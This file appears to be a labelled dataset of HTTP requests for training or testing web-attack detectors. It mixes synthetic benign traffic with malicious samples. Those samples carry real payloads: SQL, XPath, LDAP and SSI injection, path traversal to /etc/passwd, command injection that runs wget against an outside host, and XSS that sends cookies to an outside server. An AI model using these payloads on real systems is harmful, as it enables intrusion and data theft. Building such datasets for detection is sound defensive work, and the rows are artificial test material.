attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
SSI,medium,,malicious,"POST /download HTTP/1.1
Host: app.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Connection: close

comment=<!--#include file=""..\..\web.config"" -->&id=1605",,213,patt-ssi-0605,PayloadsAllTheThings,"<!--#include file=""..\..\web.config"" -->"
,hard,-2.0,benign,"GET /iPO9Z3G/j8Oe/enWT6cE/yeUOweEw70fG-dPBBQ6@/gxw9/bUlIqKwriI53nW/rdnxeaotass/hVN-4nteeG/IusrGiP/o_zJ4e-m/aSGM4b./e41._@Tmm3jXWxDG-9c.php?nmby=bRmtihttphttptee3S%3A HTTP/1.0
Host: www.olma4aEre.net
Connection: keep-alive
Accept: */*;q=0.7
Accept-Charset: *;q=0.9
Accept-Encoding: compress, identity, deflate, identity, gzip;q=0.2
Accept-Language: ne6-oo0jE, Hs-sKlme;q=0.9
Cache-Control: only-if-cached
Client-ip: 191.101.191.71
Cookie: mol=ovAftadsooTn;0yefuqwinof=objectt$bo;LIpxO2q9ZVS=a-Nb@LER;Ns0hLcssfaoovpo=h9WiiXnaofrrwm
Cookie2: $Version=""04""
Date: Wed, 26 May 04 07:18:42 GMT
ETag: ""h--L.A88i-u9EG1sS""
Expect: 100-continue
From: o5dwea@emautz6.org
If-Modified-Since: Thu, 17 Jul 08 22:39:26 GMT
If-Unmodified-Since: Mon, 28 Mar 05 13:52:31 GMT
If-Match: ""cLaDUbs8Yk4@2vM8""
If-None-Match: ""iEqTNc1iwlUlG2cOg_z""
If-Range: Thu, 01 Jan 09 08:41:39 UTC
Max-Forwards: 1
MIME-Version: 7.1
Pragma: no-cache
Proxy-Authorization: Basic ZmVjb2tmTDpvbXBl
Authorization: Basic dHR2dW5lcG86YXNsd25m
Range: 81-3452
Referer: http://www.oaeeeha.fr/iytt/jnr7/mreeTje/rseeax/elge.pl
TE: deflate
Trailer: If-Match
User-Agent: muLjRrIff http://www.esdb.st
UA-CPU: x86
UA-Disp: 514,290,8
UA-OS: WinNT
UA-Color: color32
UA-Pixels: 501x9134
Via: 5.5 www.ttsa.tiff, aHiAgO/9.8 74.217.9.245:49588, 5.1 www.nenceoeo.htm
Transfer-Encoding: identity
Upgrade: fysst/0.3
Warning: 945 www.u1eyergi.jpg:82873 ""ihvut8ngwso"" 
X-Forwarded-For: 133.218.232.127
X-Serial-Number: 09176432061314
----: ----------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",21952,1613,xml_test-21952,ECML/PKDD2007,
,hard,-2.0,benign,"GET /etcx/laytlrsyNh2Fkg7e/fjNnaKD5YM-MU_/ar8dtato4osw/zbbAE2R-_0viXvEv/ta89hoiewd/a02iodyohA/nhRefn0nmnchjrlia.cfm? HTTP/1.1
Host: 76.240.33.4
Connection: close
Accept: image/png, image/*, application/*
Accept-Charset: x-mac-japanese;q=0.7, windows-1257;q=0.6, iso-8859-9;q=0.2, windows-1254;q=0.3, iso-8859-1
Accept-Encoding: 
Accept-Language: mwh0oa-rlId;q=0.1, cigrun-d6nsoHb;q=0.3, m-enwrit, l4-veadcy
Cache-Control: no-cache
Client-ip: 185.52.126.32
Cookie: esspUoM9r6shwc=71971119;ee3ht=slzt30oeoifngnaaWi;8iQaq6giandJth=or0xexecatcs1d
Cookie2: $Version=""7""
Date: Wed, 07 May 08 15:35:03 GMT
ETag: W/""_vPuMsZzKZ_7lToRk9""
Expect: 100-continue
From: ljowseA@a57tItH0o.it
If-Modified-Since: Sun, 19 Sep 04 02:56:52 GMT
If-Unmodified-Since: Sun, 27 Feb 05 14:00:02 UTC
If-Match: ""TUuyQdYpzwja2f_IgjeK""
If-None-Match: *
If-Range: Thu, 11 May 06 19:34:27 CET
Max-Forwards: 581
MIME-Version: 0.6
Pragma: emnespc='pvE'
Proxy-Authorization: NTLM NmVnaWhlaUJpcE5zTmVvb3R1bW4yc2NBcjRlRXFFckVvTmhvbG4=
Authorization: NTLM YnNldG45TnRFMWlkaWZzc2lyczFpdWNvZVk2b2VyalY=
Range: -542,05-69330,03-679
Referer: /wE2iibit.gz
TE: deflate;q=0.9
Trailer: If-None-Match
User-Agent: Mozilla/2.2 (compatible; MSIE 4.3; SunOS sun4u; EeerFrc2e; chaDalp7b; rmixaO)
UA-CPU: StrongARM
UA-Disp: 4032,6122,16
UA-OS: Solaris
UA-Color: color32
UA-Pixels: 942x1602
Via: 6.0 183.133.38.72, 7.0 www.earsrr0o.gif, 4.2 www.tTrczwta.css:2686
Transfer-Encoding: identity
Upgrade: aie/2.7, lhn/6.7, Sure/2.4
Warning: 685 www.cMeV7n.jpg ""Rshilnhailrb"" ""Fri, 30 Apr 10 23:05:54 CET""
X-Forwarded-For: 116.27.197.85
X-Serial-Number: 74706
----: --------------------
~~~~~: ~~~~~~~~~~~~~~",17797,1689,xml_test-17797,ECML/PKDD2007,
,hard,-2.0,benign,"POST /ahbGizM-/hltgiienSieeee/i.@7MKFHzcjAZ7kSct.png? HTTP/1.0
Content-Length: 122
Content-Language: cl,coFf
Content-Encoding: deflate
Content-Location: http://bHtvsaq.de/ojirO5t/i4rdzo/caoMgib.exe
Content-MD5: ZWFvNm5hdXR4ZW50VW95ZQ==
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 31 Jul 06 03:56:48 GMT
Last-Modified: Wed, 18 Mar 09 20:16:24 CET
Host: 160.167.212.14
Connection: close
Accept: */*
Accept-Charset: *
Accept-Encoding: identity, compress;q=0.1, identity;q=0.8
Accept-Language: shcsn6e-a1vt;q=0.7, eleglehn-f7hrt
Cache-Control: min-fresh=2018
Client-ip: 203.243.153.73
Cookie: iilHbsesJh=nerN4uOS;rur=p5Ttislot=;dteo12=+y+htacces
Cookie2: $Version=""83""
Date: Mon, 09 Feb 09 10:21:35 GMT
ETag: W/""2hP-K@vQhTudBKeDn1G""
Expect: 100-continue
From: uoRceh@bnhno.gov
If-Modified-Since: Thu, 04 Sep 08 16:05:13 CET
If-Unmodified-Since: Wed, 06 Sep 06 04:15:54 GMT
If-Match: *
If-None-Match: ""9wZwDxFPjb--nR8ko""
If-Range: ""O_6Yk_YlWItGH2EO""
Max-Forwards: 33
MIME-Version: 7.6
Pragma: oaeXaD='1e0G6'
Proxy-Authorization: Digest username=""rtalafh1""
Authorization: Digest cnonce=""tuoe""
Range: -804943,968106-
Referer: http://eigi.com/Se4n/herels.asmx
TE: trailers,trailers,trailers
Trailer: Cache-Control
User-Agent: lOse (4OM1UHsw7h; hXFsyeQH; w7qxAlYmJD)
UA-CPU: 68000
UA-Disp: 1874,1837,32
UA-OS: Win98
UA-Color: color8
UA-Pixels: 5781x4344
Via: y8enJn/6.7 71.205.252.170
Transfer-Encoding: deflate
Upgrade: ezhTe/9.1, i0t/1.3, huh/6.9, rDvATi/7.5
Warning: 954 www.nnennttt.js ""hztaw"" ""Sat, 16 Oct 04 21:52:44 UTC""
X-Forwarded-For: 70.193.7.214
X-Serial-Number: 316874692201616
----: -----------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

fthtoa6ooIncee=]gl7q&wghetorwc975ytm=d3d3igihpotsdrn&onlerd=e3a services&hfaNpnn67iac=hvW_O_&iiNiCihEienwN=  n&o0=ishxss",34251,1835,xml_test-34251,ECML/PKDD2007,
,hard,-2.0,benign,"GET /iZunDXq/nneAmqhBn/cY3o9bAjyEF2ghM.jsp?iucBhlddjSewtl=nmifphtMtah&TuasuddpalZ=0iaB&6weiaohiu=mil05nce%28i&zttl1sti2hkyoe=19251&uoanrmeiasab4lt=15843062&kjdrcleendau=+pprsobahavinguiselect HTTP/1.0
Host: www.hiqnso.fr:80
Connection: mstn
Accept: image/*;q=0.4, text/*;q=0.3, video/mpeg
Accept-Charset: cp-950;q=0.8, x-mac-turkish, windows-1250, macintosh
Accept-Encoding: identity, deflate, gzip;q=0.9, gzip;q=0.6
Accept-Language: O-lsOllN;q=0.3, Ng-4orpr, n5sc-ns0ti0;q=0.6
Cache-Control: max-stale=3211
Client-ip: 30.171.51.177
Cookie: d6nh=r5sD;be0eoAdwmazpyAt=4;txlzw=odx;iedo=~oe4roe we [tfskdd%T;tuo4xcx=Inode7r:;amochalqe
Cookie2: $Version=""9""
Date: Wed, 06 Jul 05 01:15:27 CET
ETag: W/""AwaLoZCcjYP9hz.Ghq""
Expect: 0bxnik6=e4f2
From: DTqDe@hek6bsSofn.biz
If-Modified-Since: Sat, 12 Feb 05 11:04:39 CET
If-Unmodified-Since: Sun, 17 Dec 06 17:52:26 CET
If-Match: ""vvaZ55zBjQ4nKcZYwTA3""
If-None-Match: *
If-Range: *
Max-Forwards: 678
MIME-Version: 1.5
Pragma: no-cache
Proxy-Authorization: NTLM MWVsYTVjY2lFcjlvc2VFc3plZmVVaGdyZWJpbGFhZXJzb25lZUVzQTRs
Authorization: 1jai6 iFomomc=Sathae
Range: 4-,8-035554
Referer: http://ecefbia.be/ycze/aE2ttt/eests.aspx
TE: trailers
Trailer: Host
User-Agent: Mozilla/8.1 (compatible; 0hg4efe; Mac OS X; altuiId; 1stui1e)
UA-CPU: MIPS
UA-Disp: 199,4987,8
UA-OS: Windows 95
UA-Color: color16
UA-Pixels: 8597x176
Via: 1.5 www.paymnwn.htm:761
Transfer-Encoding: identity
Upgrade: sweeL/7.7, xtf/2.3, 1xnyt/4.8, ssimb/4.5, iislt/5.6
Warning: 442 www.odyfti.shtml ""igeotauecom8"" ""Mon, 10 Dec 07 02:26:29 UTC""
X-Forwarded-For: 77.185.209.175
X-Serial-Number: 767328268470976687
----: ---------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~",25982,1737,xml_test-25982,ECML/PKDD2007,
SQLi,medium,4.0,malicious,"GET /yqbEoyyhjaseA7re6oh/tXUUHr8/As8cOhtalstor2lieh/irlenot5rnwilsehtr/kpOet27qpil/neThtttha/e8BcuLMAyPHi/.taG-v.jpg?tsisrp2eas6ted6=eecnils&3z50wINl4=ncDi4o6frah2oa&SIVm=674231&e3neUxr=407&tirohe=%27++++or++id++++in+++++%28+++++select++++*++++from++user_db+++%29&ebe=5723&V7=5&_JyQ0F=ne+s HTTP/1.1
Host: www.par0e.de
Connection: sd6e
Accept: application/rtf
Accept-Charset: euc-kr
Accept-Encoding: *;q=0.1
Accept-Language: tyets-et;q=0.8, ESiE4-4, ymujnem-t;q=0.6
Cache-Control: ttintne='fiveiBs'
Client-ip: 211.249.233.8
Cookie: tdt0er8aor=Rupdate;rm3enm=4110;mt=lib=vtuAoirw~]eN;;pns=uLaialuvMWNY;EU5ymr=iffzDud2H;cuU=Ec
Cookie2: $Version=""94""
Date: Sat, 01 Nov 08 13:59:40 GMT
ETag: W/""5rgyakrT9GajtwJuxJ""
If-Unmodified-Since: Mon, 12 Nov 07 19:28:33 UTC
If-Match: ""FJvoLh-G0EVGOMA""
If-None-Match: ""kQQhM7FyU5rzLUp49Y0I""
If-Range: ""zlXUjkJtk8Wh5mK""
Max-Forwards: 42
Referer: /irfitaHx/thrsltri/soutBhae/jatdo/ocdAwayd.html
TE: trailers
Trailer: From
User-Agent: swsl6tiA (rmVPLhfuy; bWkj1tz; lOTP3u)
UA-OS: FreeBSD
Via: HTTP/6.6 66.160.77.210, 2.2 34.103.127.232, 7.5 195.110.249.122",35435,1110,xml_test-35435,ECML/PKDD2007,
Command Injection,medium,,malicious,"POST /login HTTP/1.1
Host: demo.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Connection: close

path=$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)&id=1804",,222,patt-command-injection-0804,PayloadsAllTheThings,$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
,hard,-2.0,benign,"GET /lJn0e/oIQWnn0tKP/8cDlU8gw6m/rgnAthrCasMktmoedn/y-EUdILKWs7L9/oc5go4U26SFE/hVA0B/flilsiire5tjih/dcqDZr-AL9nEv4g/mohY7ssO7Z.6imcM7/s_t.K/soofinneeoi.html?nrtds=be9twl%5C%3BbU&iWe9eiH71oew=pnni14%29eeoc&erteQ5toccb=rscdred&pma=D&arewd=e77&ezl=rcpnetcat%26idm&Wrrlhirgoaher=d+nph-e&rppaultdrfdnet=46%26c+access_logeki%5Bhokd%3Feh&ngstftel8ji8st=255769&D7inputB=2 HTTP/1.1
Host: www.i0nwneyeai.net
Connection: 6i0b
Accept: */*;q=0.5
Accept-Charset: euc-kr, iso-8859-7, windows-1253
Accept-Encoding: compress, deflate;q=0.2, compress
Accept-Language: ioego-hee, m0ctyabi-owwi
Cache-Control: no-cache
Client-ip: 174.151.119.78
Cookie: y3sMaworn0n=zruxN2yrSMh
Cookie2: $Version=""3""
Date: Thu, 18 Aug 05 02:03:11 CET
ETag: ""W1YghaQsoItNO1M""
Expect: 100-continue
From: reieurea@btrTy7r.com
If-Modified-Since: Sat, 20 Jun 09 19:34:07 GMT
If-Unmodified-Since: Tue, 17 Nov 09 10:54:08 CET
If-Match: *
If-None-Match: *
If-Range: ""Xb62SExIjlPfuLZq""
Max-Forwards: 78
MIME-Version: 7.8
Pragma: no-cache
Proxy-Authorization: Digest realm
Authorization: NTLM ZXJobjZsd3NMcnN0RWlwcG5pYWRob21lb3NubXh0b28ybnM=
Range: -93110,-40747,-37
Referer: /eaaa2r.pdf
TE: deflate
Trailer: Referer
User-Agent: anVhie/4.8
UA-CPU: StrongARM
UA-Disp: 042,750,8
UA-OS: Win95
UA-Color: color16
UA-Pixels: 561x200
Via: ifyrl/9.3 221.185.224.226, 1.7 250.30.178.196:4543
Transfer-Encoding: compress
Upgrade: zauE/7.3, k7tab/8.3, sboo/5.9, 5lei4g/4.2, Aes/7.9
Warning: 400 www.satoatm.gif ""qstaeInaenai"" 
X-Forwarded-For: 197.251.52.207
X-Serial-Number: 9554441251585
----: --------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",9895,1639,xml_test-9895,ECML/PKDD2007,
XPath Injection,medium,,malicious,"POST /login HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Connection: close

username=substring(//user[userid=5]/username,2,1)=CHAR_HERE&id=1353",,230,patt-xpath-injection-0353,PayloadsAllTheThings,"substring(//user[userid=5]/username,2,1)=CHAR_HERE"
XSS,medium,4.5,malicious,"GET /ha4i/ttttayt8ooeL/uH4ONGcASbxg/ewKHCLr9SRzQnE8I@r.shtml? HTTP/1.1
Host: 19.231.59.29:80
Connection: keep-alive
Accept: */*
Accept-Charset: euc-cn, koi8;q=0.4, euc-tw;q=0.7, cp-936, utf-7;q=0.0
Accept-Encoding: *;q=0.3
Accept-Language: *
Client-ip: 39.174.238.228
Cookie: Gdatttszo=/6zawce@td;X3nBKH=<div   style = ""     background-image:    url(javascript:[document.location.replace    ('http://www.nenarons.com/cgi-bin/sesi.cgi'+document.cookie);]);  ""   >;ftptrs=styleabrR]mZu\;bVSQB=passthruIlssu0tmpmy;ksd9bs=dcoptcpro9oum 
Date: Thu, 01 Oct 09 02:01:36 UTC
Expect: gjcr
From: eeadga@ynuze.biz
If-Match: ""PdgOD5zccvBJvesIpjh""
Max-Forwards: 1460
Pragma: tn=6krhtAr4
Authorization: tsA1o Hyh3scs=tnii
Referer: http://www.TuoFwjh.net/eadoS.js
User-Agent: nis6ild4eAgtmsrrs
Via: 2.4 www.tmmryel.jpg, FTP/6.9 134.214.128.240
~~~~~: ~~~~~~~~~~~~~~~~~~",46758,873,xml_test-46758,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /8ry4oleaoq5viyd/ezoe6cajhi8sarTnao/n1FOP/8atecvdv9idd/tbsrmPSejnihdOos/iospja1eyia/tgx8/meos1sff8scvnrirn.jsp?enhehuctrpd=doEe3hGuuoaand&QYYRa0fmocha=10&osooNnse=319&ldaprrguatAI=anodeuqto%5Ct%26t&tk2=48134945&jnernt0yrnc1h=95&oatisocrn2h5s=%27++OR++%27Eyregwe3h%27++++%3D+++++N%27+++++&W5@HhexecKst=8221312&umtimIePrntt=ueweeetfersowd8e&mehrnkr=escE%7Cd2&meIugubyai4=orjtne4etne2see5 HTTP/1.1
Host: 230.13.234.213
Connection: keep-alive
Accept: image/jpeg;q=0.6
Accept-Charset: windows-1257;q=0.1, ks_c_5601-1987, cp-950;q=0.3, ks_c_5601-1987, euc-kr;q=0.0
Accept-Encoding: gzip, gzip, identity, deflate;q=0.8, deflate
Accept-Language: exo-qut
Cache-Control: max-age=81524
Client-ip: 144.52.64.113
Cookie: ldeeptxIH=va;-3YJmpr_=q;position9zTgCzW5=877
Cookie2: $Version=""334""
Date: Wed, 24 Mar 04 14:51:39 CET
ETag: ""RNqO_dyGb@AGbsbMlT4j""
Expect: 2ltBltn8=r1t9hTn5
From: etDdz@s1Ttlneied.ch
If-Modified-Since: Fri, 24 Feb 06 05:09:41 GMT
If-Unmodified-Since: Thu, 15 Jan 09 10:48:56 CET
If-Match: ""Grhx@b@7p0VR3nv""
If-None-Match: *
If-Range: ""eNZE@sxZvflBCrhC""
Max-Forwards: 82
MIME-Version: 9.3
Pragma: no-cache
Proxy-Authorization: iaijaB rjera=cnidom
Authorization: Digest opaque=""4venij""
Range: -2,-9858,-988607
Referer: /t8tahler/rxne2/fstHuek/9enhin.mdb
TE: gzip;q=0.4
Trailer: Date
User-Agent: vghybbIy81 http://www.5eiylhou.fr
UA-CPU: StrongARM
UA-Disp: 442,012,8
UA-OS: Win98
UA-Color: color8
UA-Pixels: 0057x268
Via: HTTP/9.9 219.108.58.27, 5.0 www.isfe.js:7, FTP/7.0 74.204.27.126
Transfer-Encoding: ncge6; mb73t3n=nUkss
Upgrade: 1ra/6.0, 2yNai/3.3, a1ejc/1.5, osRwie/7.4, e6bte/5.7
Warning: 583 www.veos.jpg ""tedi"" 
X-Forwarded-For: 58.152.231.239
X-Serial-Number: 063116688396663
----: -------------------------------
~~~~~: ~~~~~~~~~~~~~~~~",42018,1801,xml_test-42018,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /profile HTTP/1.1
Host: app.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close

file=..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini&id=1995",,208,patt-path-traversal-0995,PayloadsAllTheThings,..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini
SQLi,medium,3.5,malicious,"GET /iek.OkzBcl4O3L10/QKDqmochaVF/izdJlyu2J2n8nI9ug/5aDchildbetweenGhKLbg5u.mspx?Baq=+boot.iniMoy%3FsS&ooet1ee3tvoc=8044&nfneu=Tibnoptxtermtj%40hu&7ve=1&vtusgzeet=1&lhifat=ecrN&2Bdkaeanjasn=752&alctvoEnyoOnsj=OR++++%2751lwlfii%27++++%3D++%27++%27&ohyensaif=emlexec&crcwnfaShS6hd=9gel&senust=+%7Etianytet1ohesuttt9&o5dqji5usaty=betweency HTTP/1.1
Host: www.ttdte.cz
Connection: close
Accept: application/zip;q=0.7
Accept-Charset: iso-8859-7;q=0.9
Accept-Encoding: 
Accept-Language: *;q=0.4
Cache-Control: no-store
Client-ip: 97.137.241.136
Cookie: WoCS=e) lwu-0iprw
Cookie2: $Version=""35""
Date: Fri, 15 Jun 07 20:15:45 CET
ETag: W/""tXiGyLYJXuOw39ER0""
Expect: cttahr1o
From: 6bttom@2kOpyg.org
If-Modified-Since: Wed, 16 Aug 06 18:22:05 CET
If-Unmodified-Since: Mon, 05 Jun 06 09:27:29 CET
If-Match: ""NCKukWukmNVxIKFT5p""
If-None-Match: ""E@mk8FxwZdsOt_Ws.L6""
If-Range: Thu, 17 Dec 09 03:59:25 CET
Max-Forwards: 3
MIME-Version: 0.3
Pragma: ateTrT='n'
Proxy-Authorization: Basic emg1ZWk5ZWE6NHNMZWdEdTk=
Authorization: Digest response=""3dFEc973fFBDaf8DdAccD8fD761432C3""
Range: -66
Referer: http://www.zrhc.fr/ne1Ezm/dEic/nntE4hi.msf
TE: trailers
Trailer: Max-Forwards
User-Agent: Uin8sedexn/9.5.3.8
UA-CPU: x86
UA-Disp: 814,8344,32
UA-OS: Windows 98
UA-Color: color8
UA-Pixels: 451x3766
Via: FTP/8.0 www.4He8ilw.shtml, 1d5eu/3.8 76.171.56.196, 6.0 123.216.0.165:62
Transfer-Encoding: identity
Upgrade: s1sE/7.8, ytaat/3.7, hNej/0.0
Warning: 805 www.oCYoru.jpg ""crToo"" ""Wed, 13 Feb 08 17:50:20 GMT""
X-Forwarded-For: 3.212.183.96
X-Serial-Number: 32378960313
----: -----------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",42219,1667,xml_test-42219,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /auth HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Connection: close

search=..\..\..\..\..\..\boot.ini%00index.html&id=2064",,208,patt-path-traversal-1064,PayloadsAllTheThings,..\..\..\..\..\..\boot.ini%00index.html
LDAP Injection,medium,,malicious,"GET /comments?name=query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==)) HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Accept: */*
Connection: close",,190,patt-ldap-injection-0228,PayloadsAllTheThings,query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
,hard,-2.0,benign,"GET /1WIKUY/LVATPtMM/bES.DXwVi.swf?w6afvh3rXxsy=aAbHhsheeuhtcoh9&ach=isw%5Ddia7fa&roanzagTwit=gQkByao&Sq9YY6lformMVK=agdreBT&ab9=8 HTTP/1.0
Host: 225.4.7.229
Connection: keep-alive
Accept: */*
Accept-Charset: *;q=0.5
Accept-Encoding: 
Accept-Language: edoyA-t;q=0.3, nSt48-QuacS;q=0.2, o8c-c;q=0.5
Cache-Control: no-transform
Client-ip: 151.102.247.154
Cookie: e3d=2O-2c9;Hnq=bodyjtpir2@E;iohh=1030475418;gjitqnwts=3;oilemld=327099
Cookie2: $Version=""1""
Date: Thu, 17 Feb 05 06:27:37 GMT
ETag: ""XIQI_03OH24JNGEZ""
Expect: 100-continue
From: 91yr@3eph1.it
If-Modified-Since: Fri, 10 Dec 04 11:39:37 CET
If-Unmodified-Since: Sun, 20 Nov 05 19:10:27 UTC
If-Match: ""8HbkwbvAQm_NFiCy""
If-None-Match: ""SzZ69tEb_F2u5Wi@tPV""
If-Range: ""9HFiDYn4a8njrE_DI.""
Max-Forwards: 193
MIME-Version: 6.8
Pragma: no-cache
Proxy-Authorization: ts2t eudaha=Usambx
Authorization: Basic aDVvdnl0OkVzaXJh
Range: 13344-7165,79151-
Referer: /Dereyap/8oaucU7i.asp
TE: chunked
Trailer: Referer
User-Agent: Mozilla/2.9 (X11; U; Unix 3.3; ia-pS; rv:8.2.1) Gecko/43452999
UA-CPU: PowerPC
UA-Disp: 307,9074,16
UA-OS: WinNT
UA-Color: color32
UA-Pixels: 361x375
Via: 9.0 179.213.124.72
Transfer-Encoding: gzip
Upgrade: eqa/3.4, 6rIn/9.3
Warning: 121 www.uloio.gif ""dae4cslezep1pcddhxee"" ""Fri, 17 Dec 04 20:23:59 GMT""
X-Forwarded-For: 102.8.0.254
X-Serial-Number: 13224
----: ----------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~",23643,1438,xml_test-23643,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /comments HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Connection: close

comment=..\\..\\..\\..\\..\\..\\..\\/etc/passwd&id=2051",,222,patt-path-traversal-1051,PayloadsAllTheThings,..\\..\\..\\..\\..\\..\\..\\/etc/passwd
XPath Injection,medium,2.5,malicious,"POST /mmYrgsarnf/c-AZls52/loJIvI5aIb.ZUiVd/gG9joesvawesloss/nF_A0RF5qCR/228nz7/lImlJVd.png? HTTP/1.0
Content-Length: 237
Content-Language: st,rAyaoen
Content-Encoding: identity
Content-Location: /tcsaieea/nhmwilhr.php3
Content-MD5: aWE0TG5vbWhkc2E3YW95aQ==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 14 May 04 23:44:25 CET
Host: 135.205.84.107:00
Connection: close
Accept: audio/basic;q=0.3
Accept-Charset: *;q=0.0
Accept-Encoding: 
Accept-Language: *
Cache-Control: only-if-cached
Client-ip: 17.177.61.125
Cookie: nfPz=orslaErechoiu;;eeme0r=has' or    6 < count(path/child::*)   or   'dta'   = '
Date: Fri, 25 Aug 06 13:56:55 CET
ETag: W/""So0c1aZ3EjHyt@m""
Expect: df9eki
If-Modified-Since: Fri, 10 Sep 04 23:19:47 UTC
If-Match: *
If-Range: Sat, 23 Apr 05 22:26:43 CET
Max-Forwards: 1
MIME-Version: 9.4
Referer: http://www.lntdoua.fr/vheSo/4ria.sh
Trailer: Trailer
User-Agent: ea5n/3.3
UA-CPU: x86
UA-Disp: 771,733,16
Via: nlhrie/4.3 www.eoeqesO.css
Transfer-Encoding: nTleoo
Warning: 688 108.112.238.171 ""tdennhHcshnnrdee4Fjo"" 

uny6hNlt=l9nNql s eev&ehtbstuiL0ih=eeFYy&JJe@D.=lv&E55uLtmpb2x_ti=tod&2senite7=0sock_streamYo |Is%ua4esua&iCZ9=0o&faEoS5iyyi=uth r&sitnsq9ah=lI_xhs&pc1telnet_pQA=83&leaizhstets2=e1iefenia&_CZp=458&u6ku=mghE&2T=aYi8D6@FUfor&smgfe3=d",35916,1314,xml_test-35916,ECML/PKDD2007,
LDAP Injection,medium,,malicious,"POST /auth HTTP/1.1
Host: app.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Connection: close

redirect=admin*)((|userpassword=*)&id=1049",,194,patt-ldap-injection-0049,PayloadsAllTheThings,admin*)((|userpassword=*)
